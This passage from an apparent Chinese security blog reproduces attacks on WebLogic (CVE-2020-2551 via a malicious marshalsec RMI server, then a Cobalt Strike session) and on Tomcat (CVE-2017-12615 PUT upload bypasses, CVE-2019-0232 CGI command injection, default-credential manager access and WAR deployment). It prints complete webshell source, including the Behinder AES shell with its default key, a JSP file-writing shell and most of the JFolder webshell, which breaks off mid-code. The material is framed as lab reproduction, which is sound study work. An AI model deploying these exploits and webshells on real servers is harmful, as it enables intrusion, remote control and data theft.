漏洞复现\n\n\n\n主要是利用这四个文件\n\n\n\n![image-20210505091438700](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505091438700.png)\n\n\n\n分析一下\n\n\n\n![image-20210505091548148](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505091548148.png)\n\n\n\n\n\n调用cmd执行calc\n\n\n\n编译exp.java 然后开启python服务\n\n\n\n```\njavac exp.java -source 1.6 -target 1.6\n```\n\n```\npython -m SimpleHTTPServer 8888\n```\n\n![image-20210505092121930](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505092121930.png)\n\n\n\n\n\n然后使用marshalsec起一个恶意的RMI服务\n\n\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.175.161:8888/#exp\" 1099\n```\n\n\n\n![image-20210505093107367](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505093107367.png)\n\n\n\n使用高版本 进行弹出计算器\n\n\n\n```\njava -jar weblogic_CVE_2020_2551.jar 192.168.175.210 7001 rmi://192.168.175.161:1099/exp\n```\n\n\n\n可以看到成功弹出计算器\n\n\n\n![image-20210505093026070](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505093026070.png)\n\n\n\n![image-20210505092955698](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505092955698.png)\n\n\n\n### poc上线CS\n\n\n\n修改exp.java代码\n\n\n\n重新编译一下exp.java  然后利用python开启http服务\n\n\n\n![image-20210505094346837](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505094346837.png)\n\n\n\n\n\n使用marshalsec起一个恶意的RMI服务\n\n\n\n![image-20210505094421547](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505094421547.png)\n\n\n\n进行执行\n\n```\njava -jar weblogic_CVE_2020_2551.jar 192.168.175.210 7001 rmi://192.168.175.161:1099/exp\n```\n\n\n\n\n\n![image-20210505095626737](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210505095626737.png)\n\n\n\n\n\n## Oracle Weblogic T3反序列化\n\n\n\n详细复现\n\n https://zhzhdoai.github.io/2020/08/10/Weblogic-T3\n\n https://www.secrss.com/articles/25852\n\n","tags":["Weblogic总结"],"categories":["服务攻防"]},{"title":"Tomcat总结","url":"/2021/06/22/Tomcat/","content":"\n**Tomcat**\n\n<!--more-->\n\n# Tomcat\n\n## 安装\n\n\n\n\n\n首先要有java的环境\n\n\n\n**注意：Tomcat的版本对与JAVA版本以及相应的JSP和 Servlet都是有要求的，Tomcat8版本以上的是需要Java7及以后的版本，所以需要对应JDK的版本来下载Tomcat的版本**\n\n\n\n![1619271446048](https://gitee.com/work-hard-every-day/test/raw/master/img/1619271446048.png)\n\n\n\n然后安装Tomcat  一路默认下来 就ok了\n\n\n\n\n\n![1619263844479](https://gitee.com/work-hard-every-day/test/raw/master/img/1619263844479.png)\n\n\n\n\n\n可以看到它的8080端口 已经开启了\n\n![1619263320303](https://gitee.com/work-hard-every-day/test/raw/master/img/1619263320303.png)\n\n\n\n访问一下\n\n\n\n![1619275501351](https://gitee.com/work-hard-every-day/test/raw/master/img/1619275501351.png)\n\n\n\n## Tomcat分析\n\n### 主要文件\n\n```\n1.server.xml：配置 tomcat启动的端口号、host主机、Context等\n2.web.xml:部署描述文件，这个web.xml中描述了一些默认的 servlet，部署每个 webapp时，都会调用这个文件，配置该web应用的默认 servlet \n3：tomcat-users.xml:tomcat的用户密码与权限。\n```\n\n![1619276500737](https://gitee.com/work-hard-every-day/test/raw/master/img/1619276500737.png)\n\n\n\n### 上传目录\n\n![1619276550079](https://gitee.com/work-hard-every-day/test/raw/master/img/1619276550079.png)\n\n\n\n## Tomcat渗透\n\n\n\n### Tomcat任意文件写入(CVE-2017-12615）\n\n#### 影响范围\n\nApache Tomcat7.0.0-7.0.81（默认配置）\n\n\n\n#### 复现\n\n\n\n这边我用vulhub\n\n\n\n```\nsudo service docker start \ncd vulhub/tomcat/CVE-2017-12615\nsudo docker-compose build\nsudo docker-compose up -d\n```\n\n![1619279493073](https://gitee.com/work-hard-every-day/test/raw/master/img/1619279493073.png)\n\n去底层看看源码\n\n\n\n```\nsudo docker ps\nsudo docker exec -ti a3 bash\ncat conf/web.xml |grep readonly\n```\n\n\n\n![1619279550159](https://gitee.com/work-hard-every-day/test/raw/master/img/1619279550159.png)\n\n\n\n![1619279602920](https://gitee.com/work-hard-every-day/test/raw/master/img/1619279602920.png)\n\n\n\n\n\n#### 漏洞原理\n\n产生是由于配置不当（非默认配置），将配置文件\nconf/web.xml）中的 readonly设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法\n\n\n\n#### 开始复现\n\n抓包  改位PUT  上传方式\n\n\n\n![1619279695848](https://gitee.com/work-hard-every-day/test/raw/master/img/1619279695848.png)\n\n\n\n去上传目录看看\n\n\n\n```\n/usr/local/tomcat/webapps/ROOT\n```\n\n\n\n![1619279779246](https://gitee.com/work-hard-every-day/test/raw/master/img/1619279779246.png)\n\n\n\n成功上传\n\n\n\n##### 绕过，成功上传jsp\n\n```\n1.Windows下不允许文件以空格结尾\n以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格\n2.WindowsNTFS流\nPut/dayU1.jsp：：SdaTa Http/1.13./在文件名中是非法的，也会被去除（Linux/Windows）\nPut/dayu2.jsp/http:/1.1\n```\n\n\n\n可以看到上传a001.jsp 是成功绕过了\n\n\n\n![1619280114887](https://gitee.com/work-hard-every-day/test/raw/master/img/1619280114887.png)\n\n![1619280208227](https://gitee.com/work-hard-every-day/test/raw/master/img/1619280208227.png)\n\n\n\n其他两种我就不进行演示了 \n\n\n\n都是可以的\n\n\n\n上传马儿，这边我用冰蝎进行连接\n\n\n\n**注意：不能开代理**\n\n\n\n看看冰蝎server目录下的jsp马儿\n\n![1619280600919](https://gitee.com/work-hard-every-day/test/raw/master/img/1619280600919.png)\n\n![1619280689842](https://gitee.com/work-hard-every-day/test/raw/master/img/1619280689842.png)\n\n\n\n冰蝎的jsp马儿\n\n```\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n```\n\n\n\n```\n/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/\n```\n\n\n\n注意这边要用`/`进行绕过,上传jsp\n\n\n\n![1619281552614](https://gitee.com/work-hard-every-day/test/raw/master/img/1619281552614.png)\n\n\n\n也可以看到是成功上传的\n\n\n\n![1619281576850](https://gitee.com/work-hard-every-day/test/raw/master/img/1619281576850.png)\n\n\n\n![1619281594138](https://gitee.com/work-hard-every-day/test/raw/master/img/1619281594138.png)\n\n\n\n用冰蝎进行连接一下\n\n![1619281681804](https://gitee.com/work-hard-every-day/test/raw/master/img/1619281681804.png)\n\n\n\n##### 最新版本复现\n\n\n\n这边把这个漏洞的代码 粘贴进最新的版本\n\n\n\n不加的话  PUT 上传txt都是不可以的\n\n\n\n```\n<init-param>\n <param-name>readonly</param-name>\n <param-value>false</param-value>\n</init-param>\n```\n\n\n\n![1619316374088](https://gitee.com/work-hard-every-day/test/raw/master/img/1619316374088.png)\n\n\n\n保存退出 进行重启Tomcat\n\n![1619316427883](https://gitee.com/work-hard-every-day/test/raw/master/img/1619316427883.png)\n\n\n\n![1619316466768](https://gitee.com/work-hard-every-day/test/raw/master/img/1619316466768.png)\n\n\n\n\n\n![1619316534173](https://gitee.com/work-hard-every-day/test/raw/master/img/1619316534173.png)\n\n确实是可以成功写入的\n\n\n\n![1619316568424](https://gitee.com/work-hard-every-day/test/raw/master/img/1619316568424.png)\n\n\n\n进行PUT写入txt 发现它是可以的\n\n\n\n但是绕过，上传jsp  三种方法我都试了  是不行的\n\n###### 修复\n\n\n\n\n\n把readonly 改成true\n\n```\n<init-param>\n <param-name>readonly</param-name>\n <param-value>false</param-value>\n</init-param>\n```\n\n### Tomcat远程代码执行（CVE-2019-0232）\n\n\n\n#### 影响范围\n\n```\nApache Tomcat 9.0.0.M1 to 9.0.17\nApache Tomcat 8.5.0 to 8.5.39\nApache Tomcat 7.0.0 to 7.0.93\n```\n\n\n\n这边就用 Windows 8.5.39 进行复现\n\n\n\n#### 安装\n\n\n\n同样是先安装java\n\n\n\n![1619317164402](https://gitee.com/work-hard-every-day/test/raw/master/img/1619317164402.png)\n\n\n\n然后安装Tomcat\n\n![1619317181551](https://gitee.com/work-hard-every-day/test/raw/master/img/1619317181551.png)\n\n\n\n![1619317197793](https://gitee.com/work-hard-every-day/test/raw/master/img/1619317197793.png)\n\n\n\n访问一下\n\n\n\n![1619317352951](https://gitee.com/work-hard-every-day/test/raw/master/img/1619317352951.png)\n\n\n\n#### 漏洞分析\n\nTomcat的 CGI_Servlet组件默认是关闭的，在`conf/web.xml`中找到注释的 CGIServlet部分，去掉注释，并配置 enableCmdLineArguments和executable\n\n\n\n![1619326835356](https://gitee.com/work-hard-every-day/test/raw/master/img/1619326835356.png)\n\n\n\n就是配置这里\n\n\n\n```\n<servlet>\n    <servlet-name>cgi</servlet-name>\n    <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>\n    <init-param>\n        <param-name>cgiPathPrefix</param-name>\n        <param-value>WEB-INF/cgi</param-value>\n    </init-param>\n\t<init-param>\n        <param-name>enableCmdLineArguments</param-name>\n\t\t<param-value>true</param-value>\n\t</init-param>\n\t<init-param>\n\t    <param-name>executable</param-name>\n\t    <param-value></param-value>\n\t</init-param>\n    <load-on-startup>5</load-on-startup>\n</servlet>\n```\n\n\n\n这里主要的设置是enableCmdLineArguments和 executable两个选项\n\n```\n1.enableCmdLineArguments启用后才会将Url中的参数传递到命令行\n2.executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。\n```\n\n\n\n同样在conf/web.xml中启用cgi的 servlet-mapping\n\n\n\n![1619326964457](https://gitee.com/work-hard-every-day/test/raw/master/img/1619326964457.png)\n\n\n\n\n\n修改conf/context.xml的添加 privileged=\"true\"属性，否则会没有权限\n\n\n\n```\n<Context privileged=\"true\">\n```\n\n\n\n\n\n![1619327075870](https://gitee.com/work-hard-every-day/test/raw/master/img/1619327075870.png)\n\n\n\n配置目录文件\n\n在`C:\\Tomcat\\webapps\\ROOT\\WEB-INF`下创建`cgi-bin`目录\n\n并在该目录下创建一个a001.txt\n\n里面内容随意\n\n\n\n![1619327411223](https://gitee.com/work-hard-every-day/test/raw/master/img/1619327411223.png)\n\n\n\n\n\n![1619327400322](https://gitee.com/work-hard-every-day/test/raw/master/img/1619327400322.png)\n\n\n\n记得重启一下\n\n\n\n![1619327485133](https://gitee.com/work-hard-every-day/test/raw/master/img/1619327485133.png)\n\n\n\n然后我们访问\n\n\n\n```\nhttp://192.168.175.193:8080/cgi-bin/a001.bat?&dir\n```\n\n\n\n### Tomcat弱口令&后台getshell漏洞\n\n\n\n#### 影响范围\n\nTomcat8\n\n这边就还是用vulhub进行复现\n\n```\ncd vulhub-master/tomcat/tomcat8\n\nsudo docker-compose up -d\n```\n\n![1619329013757](https://gitee.com/work-hard-every-day/test/raw/master/img/1619329013757.png)\n\n之前的容器要关掉\n\n去docker底层看看它的源码\n\n```\nsudo docker ps\nsudo docker exec -ti a bash\ncd conf\n```\n\n把这三个文件复制出来\n\n```\nsudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xml /home/dayu/Desktop/\nsudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xsd /home/dayu/Desktop/\nsudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/web.xml /home/dayu/Desktop/\n```\n\n\n\n\n\n![1619329131808](https://gitee.com/work-hard-every-day/test/raw/master/img/1619329131808.png)\n\n\n\n![1619329484692](https://gitee.com/work-hard-every-day/test/raw/master/img/1619329484692.png)\n\n\n\n![1619329494731](https://gitee.com/work-hard-every-day/test/raw/master/img/1619329494731.png)\n\n\n\n访问一下\n\n\n\n![1619329569867](https://gitee.com/work-hard-every-day/test/raw/master/img/1619329569867.png)\n\n\n\n访问一下它的后台管理地址\n\n\n\n```\n/manager/html\n```\n\n\n\n\n\n![1619329613901](https://gitee.com/work-hard-every-day/test/raw/master/img/1619329613901.png)\n\n\n\n或者点这里\n\n\n\n![1619329717080](https://gitee.com/work-hard-every-day/test/raw/master/img/1619329717080.png)\n\n\n\n它的登录窗口是没有验证码的  直接爆破就可以\n\n\n\n默认\n\n```\nUsers：Tomcat\n\nPasswd：Tomcat\n```\n\n\n\n登录进去之后 进行查看\n\n\n\n文件上传war包\n\n\n\n\n\n\n\n![1619329890433](https://gitee.com/work-hard-every-day/test/raw/master/img/1619329890433.png)\n\n\n\n**为什么需要上传wa包，为什么不是 tar.zip？？**\n\n\n\nwar包是用来进行Web开发时一个网站项目下的所有代码，包括前台HTML/CSS/JS代码，以及后台 JavaWeb的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录，当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。\n\n\n\n上传JSP的大马\n\n\n\n```\n<%@page contentType=\"text/html;charset=gb2312\"%>    \n<%@page import=\"java.io.*,java.util.*,java.net.*\"%>    \n<html>    \n  <head>    \n    <title></title>    \n    <style type=\"text/css\">    \n     body { color:red; font-size:12px; background-color:white; }    \n    </style>    \n  </head>    \n  <body>    \n  <%    \n   if(request.getParameter(\"context\")!=null)    \n   {    \n   String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");    \n   String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");    \n   OutputStream pt = null;    \n        try {    \n            pt = new FileOutputStream(path);    \n            pt.write(context.getBytes());    \n            out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getRequestURI()+\"'><font color='red' title='点击可以转到上传的文件页面!'>上传成功!</font></a>\");    \n        } catch (FileNotFoundException ex2) {    \n            out.println(\"<font color='red'>上传失败!</font>\");    \n        } catch (IOException ex) {    \n            out.println(\"<font color='red'>上传失败!</font>\");    \n        } finally {    \n            try {    \n                pt.close();    \n            } catch (IOException ex3) {    \n                out.println(\"<font color='red'>上传失败!</font>\");    \n            }    \n        }    \n}    \n  %>    \n    <form name=\"frmUpload\" method=\"post\" action=\"\">    \n    <font color=\"blue\">本文件的路径:</font><%out.print(request.getRealPath(request.getServletPath())); %>    \n    <br>    \n    <br>    \n    <font color=\"blue\">上传文件路径:</font><input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServletContext().getRealPath(\"/\")); %>\">    \n    <br>    \n    <br>    \n    上传文件内容:<textarea name=\"context\" id=\"context\" style=\"width: 51%; height: 150px;\"></textarea>    \n    <br>    \n    <br>    \n    <input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    \n    </form>    \n  </body>    \n</html>   \n\n```\n\n\n\n\n\nzip压缩 然后改后缀 成war的包\n\n\n\n![1619339840138](https://gitee.com/work-hard-every-day/test/raw/master/img/1619339840138.png)\n\n\n\n\n\n![1619339862773](https://gitee.com/work-hard-every-day/test/raw/master/img/1619339862773.png)\n\n\n\n这里的`/2` 就是war包的名字\n\n\n\n去docker底层看看是否成功上传\n\n\n\n![1619339911577](https://gitee.com/work-hard-every-day/test/raw/master/img/1619339911577.png)\n\n\n\n 它会自动部署  那我们访问一下\n\n\n\n\n\n![1619332041600](https://gitee.com/work-hard-every-day/test/raw/master/img/1619332041600.png)\n\n成功解析jsp大马，并能 upload上传功能！\n\n这里上传冰蝎的jsp马儿\n\n\n\n```\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n```\n\n\n\n```\n/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/\n```\n\n![1619340379288](https://gitee.com/work-hard-every-day/test/raw/master/img/1619340379288.png)\n\nupload之后 上冰蝎进行连接\n\n\n\n\n\n![1619340324001](https://gitee.com/work-hard-every-day/test/raw/master/img/1619340324001.png)\n\n\n\n\n\n![1619340439690](https://gitee.com/work-hard-every-day/test/raw/master/img/1619340439690.png)\n\n\n\n在贴一个牛逼的JSP大马\n\n```\n<%\n/**\nJFolder V0.9  windows platform\n@Filename： JFolder.jsp \n@Description： 一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能较弱。\n\n@Bugs  :  下载时，中文文件名无法正常显示\n*/\n%>\n<%@ page contentType=\"text/html;charset=gb2312\"%>\n<%@page import=\"java.io.*,java.util.*,java.net.*\" %>\n<%!\nprivate final static int languageNo=0; //语言版本，0 : 中文； 1：英文\nString strThisFile=\"JFolder.jsp\";\nString[] authorInfo={\" <font color=red> 岁月联盟-专用版 </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http:// </font>\"};\nString[] strFileManage   = {\"文 件 管 理\",\"File Management\"};\nString[] strCommand      = {\"CMD 命 令\",\"Command Window\"};\nString[] strSysProperty  = {\"系 统 属 性\",\"System Property\"};\nString[] strHelp         = {\"帮 助\",\"Help\"};\nString[] strParentFolder = {\"上级目录\",\"Parent Folder\"};\nString[] strCurrentFolder= {\"当前目录\",\"Current Folder\"};\nString[] strDrivers      = {\"驱动器\",\"Drivers\"};\nString[] strFileName     = {\"文件名称\",\"File Name\"};\nString[] strFileSize     = {\"文件大小\",\"File Size\"};\nString[] strLastModified = {\"最后修改\",\"Last Modified\"};\nString[] strFileOperation= {\"文件操作\",\"Operations\"};\nString[] strFileEdit     = {\"修改\",\"Edit\"};\nString[] strFileDown     = {\"下载\",\"Download\"};\nString[] strFileCopy     = {\"复制\",\"Move\"};\nString[] strFileDel      = {\"删除\",\"Delete\"};\nString[] strExecute      = {\"执行\",\"Execute\"};\nString[] strBack         = {\"返回\",\"Back\"};\nString[] strFileSave     = {\"保存\",\"Save\"};\n\npublic class FileHandler\n{\n private String strAction=\"\";\n private String strFile=\"\";\n void FileHandler(String action,String f)\n {\n \n }\n}\n\npublic static class UploadMonitor {\n\n  static Hashtable uploadTable = new Hashtable();\n\n  static void set(String fName, UplInfo info) {\n   uploadTable.put(fName, info);\n  }\n\n  static void remove(String fName) {\n   uploadTable.remove(fName);\n  }\n\n  static UplInfo getInfo(String fName) {\n   UplInfo info = (UplInfo) uploadTable.get(fName);\n   return info;\n  }\n}\n\npublic class UplInfo {\n\n  public long totalSize;\n  public long currSize;\n  public long starttime;\n  public boolean aborted;\n\n  public UplInfo() {\n   totalSize = 0l;\n   currSize = 0l;\n   starttime = System.currentTimeMillis();\n   aborted = false;\n  }\n\n  public UplInfo(int size) {\n   totalSize = size;\n   currSize = 0;\n   starttime = System.currentTimeMillis();\n   aborted = false;\n  }\n\n  public String getUprate() {\n   long time = System.currentTimeMillis() - starttime;\n   if (time != 0) {\n    long uprate = currSize * 1000 / time;\n    return convertFileSize(uprate) + \"/s\";\n   }\n   else return \"n/a\";\n  }\n\n  public int getPercent() {\n   if (totalSize == 0) return 0;\n   else return (int) (currSize * 100 / totalSize);\n  }\n\n  public String getTimeElapsed() {\n   long time = (System.currentTimeMillis() - starttime) / 1000l;\n   if (time - 60l >= 0){\n    if (time % 60 >=10) return time / 60 + \":\" + (time % 60) + \"m\";\n    else return time / 60 + \":0\" + (time % 60) + \"m\";\n   }\n   else return time<10 ? \"0\" + time + \"s\": time + \"s\";\n  }\n\n  public String getTimeEstimated() {\n   if (currSize == 0) return \"n/a\";\n   long time = System.currentTimeMillis() - starttime;\n   time = totalSize * time / currSize;\n   time /= 1000l;\n   if (time - 60l >= 0){\n    if (time % 60 >=10) return time / 60 + \":\" + (time % 60) + \"m\";\n    else return time / 60 + \":0\" + (time % 60) + \"m\";\n   }\n   else return time<10 ? \"0\" + time + \"s\": time + \"s\";\n  }\n\n }\n\n public class FileInfo {\n\n  public String name = null, clientFileName = null, fileContentType = null;\n  private byte[] fileContents = null;\n  public File file = null;\n  public StringBuffer sb = new StringBuffer(100);\n\n  public void setFileContents(byte[] aByteArray) {\n   fileContents = new byte[aByteArray.length];\n   System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);\n  }\n}\n\n// A Class with methods used to process a ServletInputStream\npublic class HttpMultiPartParser {\n\n  private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");\n  private final int ONE_MB = 1024 * 1;\n\n  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,\n    int clength) throws IllegalArgumentException, IOException {\n   if (is == null) throw new IllegalArgumentException(\"InputStream\");\n   if (boundary == null || boundary.trim().length() < 1) throw new IllegalArgumentException(\n     \"\\\"\" + boundary + \"\\\" is an illegal boundary indicator\");\n   boundary = \"--\" + boundary;\n   StringTokenizer stLine = null, stFields = null;\n   FileInfo fileInfo = null;\n   Hashtable dataTable = new Hashtable(5);\n   String line = null, field = null, paramName = null;\n   boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);\n   boolean isFile = false;\n   if (saveFiles) { // Create the required directory (including parent dirs)\n    File f = new File(saveInDir);\n    f.mkdirs();\n   }\n   line = getLine(is);\n   if (line == null || !line.startsWith(boundary)) throw new IOException(\n     \"Boundary not found; boundary = \" + boundary + \", line = \" + line);\n   while (line != null) {\n    if (line == null || !line.startsWith(boundary)) return dataTable;\n    line = getLine(is);\n    if (line == null) return dataTable;\n    stLine = new StringTokenizer(line, \";\\r\\n\");\n    if (stLine.countTokens() < 2) throw new IllegalArgumentException(\n      \"Bad data in second line\");\n    line = stLine.nextToken().toLowerCase();\n    if (line.indexOf(\"form-data\") < 0) throw new IllegalArgumentException(\n      \"Bad data in second line\");\n    stFields = new StringTokenizer(stLine.nextToken(), \"=\\\"\");\n    if (stFields.countTokens() < 2) throw new IllegalArgumentException(\n      \"Bad data in second line\");\n    fileInfo = new FileInfo();\n    stFields.nextToken();\n    paramName = stFields.nextToken();\n    isFile = false;\n    if (stLine.hasMoreTokens()) {\n     field = stLine.nextToken();\n     stFields = new StringTokenizer(field, \"=\\\"\");\n     if (stFields.countTokens() > 1) {\n      if (stFields.nextToken().trim().equalsIgnoreCase(\"filename\")) {\n       fileInfo.name = paramName;\n       String value = stFields.nextToken();\n       if (value != null && value.trim().length() > 0) {\n        fileInfo.clientFileName = value;\n        isFile = true;\n       }\n       else {\n        line = getLine(is); // Skip \"Content-Type:\" line\n        line = getLine(is); // Skip blank line\n        line = getLine(is); // Skip blank line\n        line = getLine(is); // Position to boundary line\n        continue;\n       }\n      }\n     }\n     else if (field.toLowerCase().indexOf(\"filename\") >= 0) {\n      line = getLine(is); // Skip \"Content-Type:\" line\n      line = getLine(is); // Skip blank line\n      line = getLine(is); // Skip blank line\n      line = getLine(is); // Position to boundary line\n      continue;\n     }\n    }\n    boolean skipBlankLine = true;\n    if (isFile) {\n     line = getLine(is);\n     if (line == null) return dataTable;\n     if (line.trim().length() < 1) skipBlankLine = false;\n     else {\n      stLine = new StringTokenizer(line, \": \");\n      if (stLine.countTokens() < 2) throw new IllegalArgumentException(\n        \"Bad data in third line\");\n      stLine.nextToken(); // Content-Type\n      fileInfo.fileContentType = stLine.nextToken();\n     }\n    }\nif (skipBlankLine) {\n     line = getLine(is);\n     if (line == null) return dataTable;\n    }\n    if (!isFile) {\n     line = getLine(is);\n     if (line == null) return dataTable;\n     dataTable.put(paramName, line);\n     // If parameter is dir, change saveInDir to dir\n     if (paramName.equals(\"dir\")) saveInDir = line;\n     line = getLine(is);\n     continue;\n    }\n    try {\n     UplInfo uplInfo = new UplInfo(clength);\n     UploadMonitor.set(fileInfo.clientFileName, uplInfo);\n     OutputStream os = null;\n     String path = null;\n     if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,\n       fileInfo.clientFileName));\n     else os = new ByteArrayOutputStream(ONE_MB);\n     boolean readingContent = true;\n     byte previousLine[] = new byte[2 * ONE_MB];\n     byte temp[] = null;\n     byte currentLine[] = new byte[2 * ONE_MB];\n     int read, read3;\n     if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {\n      line = null;\n      break;\n     }\n     while (readingContent) {\n      if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {\n       line = null;\n       uplInfo.aborted = true;\n       break;\n      }\n      if (compareBoundary(boundary, currentLine)) {\n       os.write(previousLine, 0, read - 2);\n       line = new String(currentLine, 0, read3);\n       break;\n      }\n      else {\n       os.write(previousLine, 0, read);\n       uplInfo.currSize += read;\n       temp = currentLine;\n       currentLine = previousLine;\n       previousLine = temp;\n       read = read3;\n      }//end else\n     }//end while\n     os.flush();\n     os.close();\n     if (!saveFiles) {\n      ByteArrayOutputStream baos = (ByteArrayOutputStream) os;\n      fileInfo.setFileContents(baos.toByteArray());\n     }\n     else fileInfo.file = new File(path);\n     dataTable.put(paramName, fileInfo);\n     uplInfo.currSize = uplInfo.totalSize;\n    }//end try\n    catch (IOException e) {\n     throw e;\n    }\n   }\n   return dataTable;\n  }\n\n  /**\n   * Compares boundary string to byte array\n   */\n  private boolean compareBoundary(String boundary, byte ba[]) {\n   byte b;\n   if (boundary == null || ba == null) return false;\n   for (int i = 0; i < boundary.length(); i++)\n    if ((byte) boundary.charAt(i) != ba[i]) return false;\n   return true;\n  }\n\n  /** Convenience method to read HTTP header lines */\n  private synchronized String getLine(ServletInputStream sis) throws IOException {\n   byte b[] = new byte[1024];\n   int read = sis.readLine(b, 0, b.length), index;\n   String line = null;\n   if (read != -1) {\n    line = new String(b, 0, read);\n    if ((index = line.indexOf('\\n')) >= 0) line = line.substring(0, index - 1);\n   }\n   return line;\n  }\n\n  public String getFileName(String dir, String fileName) throws IllegalArgumentException {\n   String path = null;\n   if (dir == null || fileName == null) throw new IllegalArgumentException(\n     \"dir or fileName is null\");\n   int index = fileName.lastIndexOf('/');\n   String name = null;\n   if (index >= 0) name = fileName.substring(index + 1);\n   else name = fileName;\n   index = name.lastIndexOf('\\\\');\n   if (index >= 0) fileName = name.substring(index + 1);\n   path = dir + File.separator + fileName;\n   if (File.separatorChar == '/') return path.replace('\\\\', File.separatorChar);\n   else return path.replace('/', File.separatorChar);\n  }\n} //End of class HttpMultiPartParser\n\nString formatPath(String p)\n{\n StringBuffer sb=new StringBuffer();\n for (int i = 0; i < p.length(); i++) \n {\n  if(p.charAt(i)=='\\\\')\n  {\n   sb.append(\"\\\\\\\\\");\n  }\n  else\n  {\n   sb.append(p.charAt(i));\n  }\n }\n return sb.toString();\n}\n\n /**\n  * Converts some important chars (int) to the corresponding html string\n  */\n static String conv2Html(int i) {\n  if (i == '&') return \"&amp;\";\n  else if (i == '<') return \"&lt;\";\n  else if (i == '>') return \"&gt;\";\n  else if (i == '\"') return \"&quot;\";\n  else return \"\" + (char) i;\n }\n\n /**\n  * Converts a normal string to a html conform string\n  */\n static String htmlEncode(String st) {\n  StringBuffer buf = new StringBuffer();\n  for (int i = 0; i < st.length(); i++) {\n   buf.append(conv2Html(st.charAt(i)));\n  }\n  return buf.toString();\n }\nString getDrivers()\n/**\nWindows系统上取得可用的所有逻辑盘\n*/\n{\n StringBuffer sb=new StringBuffer(strDrivers[languageNo] + \" : \");\n File roots[]=File.listRoots();\n for(int i=0;i<roots.length;i++)\n {\n  sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+\"\\\\','','','1','');\\\">\");\n  sb.append(roots[i]+\"</a>&nbsp;\");\n }\n return sb.toString();\n}\nstatic String convertFileSize(long filesize)\n{\n //bug 5.09M 显示5.9M\n String strUnit=\"Bytes\";\n String strAfterComma=\"\";\n int intDivisor=1;\n if(filesize>=1024*1024)\n {\n  strUnit = \"MB\";\n  intDivisor=1024*1024;\n }\n else if(filesize>=1024)\n {\n  strUnit = \"KB\";\n  intDivisor=1024;\n }\n if(intDivisor==1) return filesize + \" \" + strUnit;\n strAfterComma = \"\" + 100 * (filesize % intDivisor) / intDivisor ;\n if(strAfterComma==\"\") strAfterComma=\".0\";\n return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;\n}\n%>\n<%\nrequest.setCharacterEncoding(\"gb2312\");\nString tabID = request.getParameter(\"tabID\");\nString strDir = request.getParameter(\"path\");\nString strAction = request.getParameter(\"action\");\nString strFile = request.getParameter(\"file\");\nString strPath = strDir + \"\\\\\" + strFile; \nString strCmd = request.getParameter(\"cmd\");\nStringBuffer sbEdit=new StringBuffer(\"\");\nStringBuffer sbDown=new StringBuffer(\"\");\nStringBuffer sbCopy=new StringBuffer(\"\");\nStringBuffer sbSaveCopy=new StringBuffer(\"\");\nStringBuffer sbNewFile=new StringBuffer(\"\");\n\nif((tabID==null) || tabID.equals(\"\"))\n{\n tabID = \"1\";\n}\n\nif(strDir==null||strDir.length()<1)\n{\n strDir = request.getRealPath(\"/\");\n}\n\n\nif(strAction!=null && strAction.equals(\"down\"))\n{\n File f=new File(strPath);\n if(f.length()==0)\n {\n  sbDown.append(\"文件大小为 0 字节，就不用下了吧\");\n }\n 